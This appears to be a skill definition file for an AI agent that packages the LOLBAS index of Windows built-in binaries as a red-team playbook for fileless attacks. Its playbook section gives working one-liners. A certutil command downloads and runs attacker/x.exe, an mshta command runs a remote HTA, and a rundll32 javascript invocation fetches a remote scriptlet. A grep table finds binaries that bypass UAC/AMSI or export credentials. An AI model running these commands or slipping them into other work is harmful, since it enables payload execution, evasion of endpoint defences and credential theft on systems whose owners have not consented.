---
name: lolbas-living-off-land
description: "LOLBAS project: Use built-in tools to download/execute payloads and fileless rundll32 execution. Signals: fileless attack, lolbins, find binaries that download files, find binaries that execute commands, find binaries that export credentials."
zh-signals: "LOLBAS 项目: 系统自带工具下载并执行 payload、rundll32 无文件执行。信号:无文件攻击,lolbins,查可下载文件的二进制,查可执行命令的二进制,查可导出凭据的。"
when-to-use: "Use when planning fileless attacks or defense evasion and you need to find built-in Windows binaries that download files, execute commands, or export credentials. Use as a reference index during red-team operations."
---

# LOLBAS Project

- Attack Category: C23 Fileless Attacks and LOLBins Abuse
- Upstream Repository: https://github.com/LOLBAS-Project/LOLBAS
- Upstream License: MIT (content library) (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/LOLBAS-Project/LOLBAS or browse lolbas-project.github.io online
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `git grep -i 'download' -- '*.md'` | Find binaries that can download files |
| `git grep -i 'execution'` | Find binaries that can execute commands |
| `git grep -i 'encode'` | Find binaries that can encode (binary → base64) |
| `git grep -i 'bypass'` | Find ones that can bypass UAC/AMSI |
| `git grep -i 'credentials'` | Find binaries that can export credentials |

## Attack Scenario Playbook

### Download and execute a payload with built-in tools

```bash
# Download and execute with certutil (often allowed by allowlists):
certutil.exe -urlcache -split -f http://attacker/x.exe C:\Windows\Temp\x.exe && C:\Windows\Temp\x.exe
# Execute a remote script with mshta:
mshta.exe http://attacker/evil.hta
```

### Fileless execution with rundll32

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker/x.sct")
```

## Notes

The authoritative index of 200+ abusable built-in Windows binaries; every entry lists the audit command and bypass usage, so agents can search it by scenario.
